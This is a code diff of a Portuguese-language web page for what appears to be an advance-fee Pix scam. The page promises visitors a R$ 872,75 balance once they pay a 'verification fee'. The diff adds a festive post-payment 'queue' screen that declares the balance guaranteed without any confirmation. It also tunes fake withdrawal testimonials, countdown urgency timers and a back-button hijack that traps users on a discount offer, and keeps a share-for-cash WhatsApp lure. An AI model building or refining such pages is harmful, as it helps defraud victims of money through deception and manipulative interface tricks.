@@ -10,8 +10,22 @@
       from { transform: translateY(-10px); opacity: 0; }
       to { transform: translateY(0); opacity: 1; }
     }
+    @keyframes bounceSlow {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+    @keyframes pulseGlow {
+      0%, 100% { opacity: 0.8; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.05); }
+    }
     .toast-anim {
       animation: slideDown 0.3s ease-out forwards;
+    }
+    .celebrate-bounce {
+      animation: bounceSlow 2s ease-in-out infinite;
+    }
+    .glow-effect {
+      animation: pulseGlow 2.5s ease-in-out infinite;
     }
     .no-scrollbar::-webkit-scrollbar {
       display: none;
@@ -357,12 +371,12 @@
 
     <!-- ETAPA 9: Tela do Pix Copia e Cola -->
     <div id="step-9" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-6 text-center">
-      <div class="w-16 h-16 bg-emerald-50 text-emerald-500 rounded-2xl mx-auto flex items-center justify-center text-3xl shadow-inner">
+      <div class="w-16 h-16 bg-emerald-50 text-emerald-500 rounded-2xl mx-auto flex items-center justify-center text-3xl shadow-inner animate-pulse">
         ⚡
       </div>
       <div class="space-y-1">
         <h2 class="text-xl font-bold text-slate-900">Pix Gerado na Sua Conta</h2>
-        <p class="text-xs text-slate-500">Copie o código abaixo e pague no app do seu banco para receber o valor total.</p>
+        <p class="text-xs text-slate-500">Copie o código abaixo e pague no app do seu banco. Assim que pagar, clique no botão abaixo!</p>
       </div>
 
       <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 space-y-3">
@@ -373,16 +387,54 @@
         </button>
       </div>
 
-      <div class="text-xs text-slate-500 bg-amber-50 border border-amber-100 p-3 rounded-xl text-left leading-relaxed">
-        ⚠️ Assim que o pagamento for confirmado via SyncPay, o saldo de <span class="total-balance-display">R$ 872,75</span> será enviado automaticamente para a sua conta.
-      </div>
+      <!-- Botão para avançar imediatamente para a tela de fila após realizar o pagamento -->
+      <button onclick="switchStep(10)" class="w-full bg-emerald-600 hover:bg-emerald-700 active:scale-[0.98] text-white font-black py-4 px-4 rounded-2xl shadow-lg transition-all cursor-pointer text-sm flex items-center justify-center space-x-2">
+        <span>✅ JÁ FIZ O PAGAMENTO, AVANÇAR ›</span>
+      </button>
 
-      <button onclick="switchStep(8)" class="w-full bg-slate-100 hover:bg-slate-200 text-slate-600 font-medium py-2.5 px-4 rounded-xl text-xs cursor-pointer transition-all">
+      <button onclick="switchStep(8)" class="w-full bg-slate-100 hover:bg-slate-200 text-slate-600 font-medium py-2 px-4 rounded-xl text-xs cursor-pointer transition-all">
         ← Voltar e alterar dados / CPF
       </button>
     </div>
 
-    <!-- ETAPA 10: TELA / MODAL DE DESCONTO -->
+    <!-- ETAPA 10: TELA DE FILA E PARABÉNS ANIMADA (ANTES DA CONFIRMAÇÃO DO WEBHOOK) -->
+    <div id="step-10" class="step-view hidden bg-gradient-to-b from-pink-500 via-rose-600 to-purple-700 rounded-3xl p-6 shadow-2xl text-white text-center space-y-6 relative overflow-hidden glow-effect">
+      <!-- Efeito visual de fogos e emojis festivos flutuantes -->
+      <div class="absolute inset-0 pointer-events-none opacity-25 flex justify-around items-center text-4xl">
+        <span>🎆</span><span>✨</span><span>🎉</span><span>🎇</span><span>🥳</span><span>🚀</span>
+      </div>
+
+      <div class="w-20 h-20 bg-white/20 backdrop-blur-md rounded-full mx-auto flex items-center justify-center text-4xl shadow-lg celebrate-bounce border border-white/40">
+        🚀
+      </div>
+
+      <div class="space-y-2 relative z-10">
+        <span class="bg-yellow-300 text-slate-900 font-black text-[10px] px-3 py-1 rounded-full uppercase tracking-widest shadow">
+          PARABÉNS PELA PARTICIPAÇÃO!
+        </span>
+        <h2 class="text-2xl font-black tracking-tight leading-tight">
+          PAGAMENTO DA TAXA REGISTRADO!
+        </h2>
+      </div>
+
+      <div class="bg-white/15 backdrop-blur-md border border-white/30 rounded-2xl p-5 space-y-2.5 relative z-10 shadow-lg">
+        <p class="text-xs font-extrabold text-yellow-300 uppercase tracking-wide">✨ STATUS DA RECOMPENSA:</p>
+        <p class="text-base font-black text-white leading-relaxed">
+          “Você já está na fila! Assim que seus dados forem confirmados com o Pix, você receberá sua recompensa”
+        </p>
+      </div>
+
+      <div class="bg-black/20 rounded-2xl p-3 text-xs space-y-1 relative z-10">
+        <span class="text-pink-200 block">Saldo total garantido:</span>
+        <span class="text-2xl font-black text-yellow-300 total-balance-display">R$ 872,75</span>
+      </div>
+
+      <button onclick="location.reload()" class="w-full bg-yellow-400 hover:bg-yellow-300 active:scale-[0.98] text-slate-900 font-black py-3.5 px-4 rounded-xl shadow-lg transition-all cursor-pointer text-sm relative z-10">
+        CONCLUÍDO / VOLTAR AO INÍCIO
+      </button>
+    </div>
+
+    <!-- ETAPA 11: TELA / MODAL DE DESCONTO -->
     <div id="step-discount" class="step-view hidden bg-white rounded-3xl p-6 shadow-2xl border-2 border-emerald-400 space-y-5 text-center relative">
       <div class="bg-emerald-50 border border-emerald-200 p-3 rounded-2xl space-y-1">
         <div class="text-emerald-700 font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-1">
@@ -413,7 +465,7 @@
       </button>
     </div>
 
-    <!-- SEÇÃO NOVAS AVALIAÇÕES (QUEM JÁ SACOU HOJE) -->
+    <!-- SEÇÃO NOVAS AVALIAÇÕES -->
     <div class="space-y-3 pt-2">
       <div class="flex items-center justify-between px-1">
         <h3 class="text-xs font-black uppercase tracking-wider text-slate-700">QUEM JÁ SACOU HOJE</h3>
@@ -451,20 +503,6 @@
           </div>
           <p class="text-xs text-slate-600 leading-snug">"Aqui demorou um pouquinho no Pix por causa do banco, mas caiu certinho! Valeu d+!"</p>
         </div>
-
-        <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
-          <div class="flex items-center justify-between">
-            <div class="flex items-center gap-2.5">
-              <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&auto=format&fit=crop&q=80" alt="Camila" class="w-9 h-9 rounded-full object-cover">
-              <div>
-                <p class="font-bold text-xs text-slate-900">Camila Rocha</p>
-                <p class="text-[10px] text-slate-400">há 27 min</p>
-              </div>
-            </div>
-            <div class="text-amber-400 text-xs">★★★★★</div>
-          </div>
-          <p class="text-xs text-slate-600 leading-snug">"to amando kkkk paguei as continhas e sobrou troco"</p>
-        </div>
       </div>
     </div>
 
@@ -480,7 +518,6 @@
         <p class="text-xs text-pink-100 leading-relaxed">Compartilhe o link do programa no WhatsApp. A cada compartilhamento seu saldo aumenta na hora!</p>
       </div>
 
-      <!-- Grade de Bônus Progressivos -->
       <div class="grid grid-cols-3 gap-2 py-1 text-center">
         <div id="bonus-card-1" class="bg-white/10 border border-white/20 rounded-2xl p-2.5 backdrop-blur-xs transition-all">
           <p class="text-[10px] text-pink-200 font-bold uppercase">1º Amigo</p>
@@ -499,13 +536,11 @@
         </div>
       </div>
 
-      <!-- Botão Único de Compartilhamento -->
       <button onclick="shareLink()" id="btn-share-link" class="w-full bg-amber-400 hover:bg-amber-300 active:scale-[0.98] text-slate-900 font-black py-3.5 px-4 rounded-xl shadow-lg transition-all cursor-pointer flex items-center justify-center space-x-2 text-sm">
         <span class="text-lg">📲</span>
         <span id="share-btn-text">COMPARTILHAR NO WHATSAPP (+R$ 50,00)</span>
       </button>
 
-      <!-- Código de Convite -->
       <div class="flex items-center justify-between bg-black/20 rounded-xl px-3 py-2 text-xs">
         <span class="text-pink-200">Seu código exclusivo:</span>
         <span class="font-mono font-bold text-amber-300 tracking-wider">TK882910</span>
@@ -520,7 +555,6 @@
       </div>
 
       <div class="space-y-2.5">
-        <!-- FAQ 1 -->
         <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
           <button onclick="toggleFaq(1)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
             <span>Quando o dinheiro cai na minha conta?</span>
@@ -531,7 +565,6 @@
           </div>
         </div>
 
-        <!-- FAQ 2 -->
         <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
           <button onclick="toggleFaq(2)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
             <span>Por que preciso pagar a taxa de verificação?</span>
@@ -542,7 +575,6 @@
           </div>
         </div>
 
-        <!-- FAQ 3 -->
         <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
           <button onclick="toggleFaq(3)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
             <span>Minha chave PIX precisa estar no meu CPF?</span>
@@ -553,7 +585,6 @@
           </div>
         </div>
 
-        <!-- FAQ 4 -->
         <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
           <button onclick="toggleFaq(4)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
             <span>Qual o valor máximo permitido por saque?</span>
@@ -582,7 +613,7 @@
     let discountCountdown = 299;
     let discountInterval = null;
     let urgencyInterval = null;
-    let urgencySeconds = 300; // 5 minutos
+    let urgencySeconds = 300;
     let hasDiscountBeenApplied = false;
     let shareCount = 0;
     let isVideoPlaying = false;
@@ -683,10 +714,10 @@
     function setupBackRedirect() {
       history.pushState({ step: currentStep }, null, location.href);
       window.onpopstate = function (e) {
-        if (currentStep >= 7 || currentStep === 'discount') {
+        if (currentStep >= 7 && currentStep < 10) {
           history.pushState(null, null, location.href);
           showDiscountScreen();
-        } else if (currentStep > 1) {
+        } else if (currentStep > 1 && currentStep !== 10) {
           switchStep(currentStep - 1);
         } else {
           history.pushState(null, null, location.href);
@@ -915,7 +946,6 @@
           btnDone.classList.add('bg-pink-600', 'hover:bg-pink-700', 'text-white', 'cursor-pointer', 'shadow-md', 'shadow-pink-200');
           btnDone.textContent = "Solicitar Saque do Saldo";
 
-          // Exibe o cronômetro de urgência de 5 minutos
           document.getElementById('urgency-box').classList.remove('hidden');
           startUrgencyTimer();
         }
@@ -937,7 +967,6 @@
           urgencySeconds--;
         } else {
           clearInterval(urgencyInterval);
-          // Se zerar, redireciona automaticamente para a tela de desconto especial
           showDiscountScreen();
         }
       }, 1000);
